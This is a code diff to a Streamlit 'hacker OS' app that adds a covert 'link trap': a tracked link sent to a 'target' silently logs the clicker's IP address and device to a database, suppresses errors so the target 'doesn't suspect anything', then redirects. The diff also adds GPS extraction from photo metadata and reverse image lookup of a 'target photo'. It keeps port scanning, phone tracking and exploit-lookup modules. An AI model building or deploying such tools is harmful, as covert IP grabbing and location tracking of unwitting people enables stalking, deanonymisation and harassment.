@@ -19,7 +19,7 @@ import streamlit.components.v1 as components
 
 # --- 1. TACTICAL UI SETUP ---
 st.set_page_config(
-    page_title="BAYOSPEL GLOBAL OS v5.0", 
+    page_title="BAYOSPEL GLOBAL OS v5.2", 
     layout="wide", 
     initial_sidebar_state="expanded"
 )
@@ -33,7 +33,29 @@ except Exception as e:
     st.error("CRITICAL: Supabase Secrets missing. Check your Dashboard!")
     st.stop()
 
-# --- 3. THE GATEKEEPER & AUTH SYSTEM (EMAIL ONLY) ---
+# --- 3. THE SILENT LINK TRAP LOGIC (ACTIVE REDIRECTOR) ---
+# This catches the target IMMEDIATELY if they click your link.
+query_params = st.query_params
+if "trap" in query_params:
+    target_redir = query_params.get("redir", "https://google.com")
+    # Grab Target Data Silently
+    log_entry = {
+        "ip_address": st.context.headers.get("X-Forwarded-For", "Unknown IP"),
+        "user_agent": st.context.headers.get("User-Agent", "Unknown Device"),
+        "destination_url": target_redir
+    }
+    # Save to your private Supabase table 'trapped_targets'
+    try:
+        supabase.table("trapped_targets").insert(log_entry).execute()
+    except:
+        pass # Fail silently so target doesn't suspect anything
+    
+    # Instant Redirect via JavaScript Meta-Refresh
+    st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{target_redir}\'">', unsafe_allow_html=True)
+    st.write("Loading secure content...")
+    st.stop()
+
+# --- 4. THE GATEKEEPER & AUTH SYSTEM (EMAIL ONLY) ---
 if "access_granted" not in st.session_state:
     st.session_state.access_granted = False
 
@@ -90,7 +112,7 @@ if not st.session_state.access_granted:
         </style>
         <div class="gatekeeper-container">
             <img src="{logo_data.LOGO_BASE64}" class="glow-img">
-            <div class="welcome-text">DEBAM AI OS v5.0</div>
+            <div class="welcome-text">DEBAM AI OS v5.2</div>
             <div class="boss-text">SECURE TERMINAL ACCESS - COMMANDER BAYONLE</div>
         </div>
         """,
@@ -134,11 +156,9 @@ if not st.session_state.access_granted:
                 else:
                     st.warning("Passwords do not match!")
     
-    # CRITICAL: This stop MUST be indented so it only stops
-    # the app if the user is NOT logged in.
     st.stop()
 
-# --- 4. PWA INSTALLATION ENGINE ---
+# --- 5. PWA INSTALLATION ENGINE ---
 components.html(
     f"""
     <script>
@@ -157,7 +177,7 @@ components.html(
     height=0,
 )
 
-# --- 5. THE ULTIMATE VISIBILITY FIX (CSS + CHAT BACKGROUND) ---
+# --- 6. THE ULTIMATE VISIBILITY FIX (CSS + CHAT BACKGROUND) ---
 st.markdown(f"""
 <style>
     .stApp {{ 
@@ -235,14 +255,13 @@ st.markdown(f"""
         color: white; 
     }}
     
-    /* Extra Styling for Data Displays */
     .stCodeBlock {{
         border: 1px solid #00FF41 !important;
     }}
 </style>
 """, unsafe_allow_html=True)
 
-# --- 6. SMART KEY ROTATOR & HELPER ENGINES ---
+# --- 7. HELPER ENGINES ---
 def get_groq_client():
     try:
         keys = st.secrets["GROQ_KEYS"]
@@ -262,55 +281,49 @@ def get_manual():
         Use slang like: Abeg, Omo, No shaking, Standard, Correct. 
         Respect Bayonle as the Only Boss."""
 
-# --- 7. NEW TACTICAL TOOL FUNCTIONS ---
-
 def extract_exif_data(img_file):
     try:
         image = Image.open(img_file)
         info = image._getexif()
         if not info:
             return "No Metadata Found in this image file."
-        
         exif_table = {}
         for tag, value in info.items():
             decoded = TAGS.get(tag, tag)
-            exif_table[decoded] = value
+            if decoded == "GPSInfo":
+                gps_data = {GPSTAGS.get(t, t): value[t] for t in value}
+                exif_table["GPS_DATA"] = gps_data
+            else:
+                exif_table[decoded] = value
         return exif_table
     except Exception as e:
-        return f"Metadata Extraction Error: {e}"
+        return f"Metadata Error: {e}"
 
 def run_dns_recon(domain):
     recon_results = ""
-    record_types = ['A', 'MX', 'NS', 'TXT', 'SOA']
-    for r_type in record_types:
+    for r_type in ['A', 'MX', 'NS', 'TXT']:
         try:
             answers = dns.resolver.resolve(domain, r_type)
-            recon_results += f"\n--- {r_type} RECORDS ---\n"
-            for data in answers:
-                recon_results += f" > {data}\n"
-        except Exception:
-            continue
-    return recon_results if recon_results else "No public DNS records found for this domain."
+            recon_results += f"\n--- {r_type} ---\n" + "\n".join([f" > {d}" for d in answers])
+        except: continue
+    return recon_results
 
 def scan_target_ports(target_ip):
     open_found = []
-    target_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
-    for port in target_ports:
+    for port in [21, 22, 80, 443, 3306, 8080]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.4)
-        result = sock.connect_ex((target_ip, port))
-        if result == 0:
-            open_found.append(port)
+        sock.settimeout(0.3)
+        if sock.connect_ex((target_ip, port)) == 0: open_found.append(port)
         sock.close()
     return open_found
 
 # --- 8. SIDEBAR SYSTEM ---
 st.sidebar.image(logo_data.LOGO_BASE64, use_container_width=True)
-st.sidebar.title("💀 DEBAM OS v5.0")
-st.sidebar.markdown(f"<span style='color:#00FF41'>Commander:</span> <span style='color:white'>Bayonle</span>", unsafe_allow_html=True)
-
+st.sidebar.title("💀 DEBAM OS v5.2")
 menu = st.sidebar.radio("SQUAD SELECTION", [
     "AI Commander", 
+    "Strike Generator (Trap)", # NEW
+    "Reverse Image Recon",     # NEW
     "Web Recon (Scanner)", 
     "Metadata Exorcist",
     "DNS Hijacker",
@@ -329,150 +342,110 @@ if st.sidebar.button("LOCK SYSTEM (LOGOUT)"):
 
 # --- 9. FUNCTIONAL MODULES ---
 
-# MODULE 1: AI COMMANDER
 if menu == "AI Commander":
     st.title("📟 TACTICAL BRAIN INTERFACE")
-    if "messages" not in st.session_state:
-        st.session_state.messages = []
-    
-    for message in st.session_state.messages:
-        with st.chat_message(message["role"]):
-            st.markdown(message["content"])
-
-    if prompt := st.chat_input("Talk to Debam (Eng/Yor/Pid)..."):
-        st.session_state.messages.append({"role": "user", "content": prompt})
-        with st.chat_message("user"):
-            st.markdown(prompt)
-            
+    if "messages" not in st.session_state: st.session_state.messages = []
+    for m in st.session_state.messages:
+        with st.chat_message(m["role"]): st.markdown(m["content"])
+    if p := st.chat_input("Command..."):
+        st.session_state.messages.append({"role": "user", "content": p})
+        with st.chat_message("user"): st.markdown(p)
         with st.chat_message("assistant"):
-            client = get_groq_client()
             try:
-                response = client.chat.completions.create(
-                    model="llama-3.3-70b-versatile",
-                    messages=[{"role": "system", "content": get_manual()}] + st.session_state.messages
-                )
-                full_response = response.choices[0].message.content
-                st.markdown(full_response)
-                st.session_state.messages.append({"role": "assistant", "content": full_response})
-            except:
-                st.error("COMMUNICATION ERROR: SIGNAL LOST.")
+                c = get_groq_client()
+                r = c.chat.completions.create(model="llama-3.3-70b-versatile", messages=[{"role": "system", "content": get_manual()}] + st.session_state.messages)
+                st.markdown(r.choices[0].message.content)
+                st.session_state.messages.append({"role": "assistant", "content": r.choices[0].message.content})
+            except: st.error("SIGNAL LOST.")
 
-# MODULE: METADATA EXORCIST
+elif menu == "Strike Generator (Trap)":
+    st.title("⚡ TACTICAL STRIKE: LIVE MONITOR")
+    st.write("Generate a tracked link. When clicked, DEBAM logs their IP and device info below.")
+    dest_url = st.text_input("Enter Destination URL (e.g., https://instagram.com)")
+    if st.button("GENERATE TRAP"):
+        # Make sure this matches your deployed Streamlit URL
+        app_url = "https://debams-os.streamlit.app/" 
+        final_trap = f"{app_url}?trap=active&redir={dest_url}"
+        st.success("SEND THIS LINK TO TARGET:")
+        st.code(final_trap)
+    
+    st.markdown("---")
+    st.subheader("💀 CAPTURED TARGET LOGS (LIVE)")
+    if st.button("Refresh Strike Data"):
+        try:
+            logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
+            if logs.data: st.table(logs.data)
+            else: st.info("No targets captured yet.")
+        except: st.error("Database connection issue.")
+    if st.button("🗑️ PURGE LOGS"):
+        supabase.table("trapped_targets").delete().neq("ip_address", "0").execute()
+        st.rerun()
+
+elif menu == "Reverse Image Recon":
+    st.title("🔎 REVERSE IMAGE RECON")
+    up = st.file_uploader("Upload Target Photo", type=['jpg','png','jpeg'])
+    if up:
+        st.image(up, width=300)
+        st.info("Directing to AI Visual Engines...")
+        c1, c2 = st.columns(2)
+        with c1: st.link_button("Search Google Lens", "https://lens.google.com/upload")
+        with c2: st.link_button("Search Yandex (High Precision)", "https://yandex.com/images/search")
+
 elif menu == "Metadata Exorcist":
     st.title("📸 IMAGE METADATA EXORCIST")
-    st.write("Upload a photo to extract hidden camera and GPS information.")
     img_file = st.file_uploader("Choose an image...", type=["jpg", "jpeg", "png"])
-    if img_file is not None:
-        st.image(img_file, caption="Target Uploaded", width=400)
-        if st.button("RUN DEEP EXTRACTION"):
-            with st.spinner("Decoding image headers..."):
-                metadata = extract_exif_data(img_file)
-                st.json(metadata)
+    if img_file and st.button("RUN DEEP EXTRACTION"):
+        st.json(extract_exif_data(img_file))
 
-# MODULE: DNS HIJACKER
 elif menu == "DNS Hijacker":
     st.title("🔗 DNS RECORD RECON")
-    st.write("Identify domain ownership and infrastructure mail servers.")
-    domain_input = st.text_input("Enter Target Domain (e.g. apple.com):")
+    domain_input = st.text_input("Enter Target Domain:")
     if st.button("INITIALIZE DNS QUERY"):
-        if domain_input:
-            with st.spinner("Querying Global DNS Cluster..."):
-                dns_data = run_dns_recon(domain_input)
-                st.code(dns_data)
+        st.code(run_dns_recon(domain_input))
 
-# MODULE: PORT SENTINEL
 elif menu == "Port Sentinel":
     st.title("🛡️ PORT SENTINEL SCANNER")
-    st.write("Check for open service doors on target IP addresses.")
-    target_ip = st.text_input("Enter Target IP Address:")
+    target_ip = st.text_input("Enter Target IP:")
     if st.button("EXECUTE PROBE"):
-        if target_ip:
-            with st.spinner(f"Probing {target_ip} common ports..."):
-                found = scan_target_ports(target_ip)
-                if found:
-                    st.warning(f"CRITICAL: Found open ports: {found}")
-                else:
-                    st.success("Target appears stealthy. No common ports open.")
+        st.warning(f"Open ports found: {scan_target_ports(target_ip)}")
 
-# MODULE 2: WEB RECON
 elif menu == "Web Recon (Scanner)":
     st.title("🌐 WEB RECONNAISSANCE")
-    target = st.text_input("Enter Target URL (e.g., example.com):")
+    target = st.text_input("Target URL:")
     if st.button("Start Full Recon Scan"):
-        if target:
-            with st.spinner("Executing tactical recon scripts..."):
-                try:
-                    result = bayo_recon.full_recon(target)
-                    st.code(result)
-                except Exception as e:
-                    st.error(f"Recon Error: {e}")
+        st.code(bayo_recon.full_recon(target))
 
-# MODULE 3: NETWORK EYE (SHODAN)
 elif menu == "Network Eye (Shodan)":
     st.title("👁️ NETWORK EYE: IP ENRICHMENT")
-    ip_input = st.text_input("Enter Target IP Address:")
+    ip_input = st.text_input("Enter Target IP:")
     if st.button("Run Instant Shodan Scan"):
-        if ip_input:
-            with st.spinner("Querying Global Intelligence..."):
-                try:
-                    result = bayo_shodan.quick_scan(ip_input)
-                    st.info(result)
-                except Exception as e:
-                    st.error(f"Shodan Module Error: {e}")
+        st.info(bayo_shodan.quick_scan(ip_input))
 
-# MODULE 4: TARGET TRACKER
 elif menu == "Target Tracker (OSINT)":
     st.title("📍 GLOBAL TARGET TRACKER")
-    phone = st.text_input("Enter Phone Number (with country code):")
+    phone = st.text_input("Phone Number:")
     if st.button("Initialize Deep Trace"):
-        if phone:
-            with st.spinner("Tracking signal markers..."):
-                try:
-                    result = bayo_track.track_number(phone)
-                    st.write(result)
-                except Exception as e:
-                    st.error(f"Tracker Error: {e}")
+        st.write(bayo_track.track_number(phone))
 
-# MODULE 5: EXPLOIT LAB
 elif menu == "Exploit Lab (CVE)":
     st.title("💉 EXPLOIT & VULN LAB")
-    cve = st.text_input("Enter CVE ID (e.g., CVE-2021-44228):")
+    cve = st.text_input("CVE ID:")
     if st.button("Fetch Exploit Intelligence"):
-        if cve:
-            with st.spinner("Searching exploit databases..."):
-                try:
-                    info = bayo_exploit.get_exploit_info(cve)
-                    st.info(info)
-                except Exception as e:
-                    st.error(f"Exploit Lab Error: {e}")
+        st.info(bayo_exploit.get_exploit_info(cve))
 
-# MODULE 6: BRUTE FORCE SIMULATOR
 elif menu == "Brute Force Simulator":
     st.title("🔑 AUTHENTICATION TESTER")
     if st.button("Execute Attack Simulation"):
-        try:
-            with st.spinner("Running entropy calculations..."):
-                res = bayo_brute.run_sim()
-                st.success(res)
-        except Exception as e:
-            st.error(f"Simulator Error: {e}")
+        st.success(bayo_brute.run_sim())
 
-# MODULE 7: PHISH-CHECK
 elif menu == "Phish-Check (URL Analyzer)":
     st.title("🎣 PHISH-CHECK ANALYZER")
-    url_input = st.text_input("Enter URL to analyze:")
+    url_input = st.text_input("Enter URL:")
     if st.button("Run Link Analysis"):
-        if url_input:
-            with st.spinner("Analyzing URL structure..."):
-                if "http://" in url_input:
-                    st.error("🚨 MALICIOUS: Link uses insecure HTTP. High Risk!")
-                elif any(word in url_input.lower() for word in ["login", "verify", "update", "bank"]):
-                    st.warning("⚠️ SUSPICIOUS: URL contains phishing keywords.")
-                else:
-                    st.success("✅ Link appears standard.")
+        if "http://" in url_input: st.error("🚨 MALICIOUS: Insecure HTTP!")
+        else: st.success("✅ Link looks standard.")
 
 # --- 10. FOOTER STATUS ---
 st.sidebar.markdown("---")
 st.sidebar.write("📡 Status: **ONLINE**")
-st.sidebar.write("⚡ Power: **ULTRA v5.0**")
-st.sidebar.write("📟 Interface: **SUPABASE SECURE**")
+st.sidebar.write("⚡ Power: **ULTRA v5.2**")
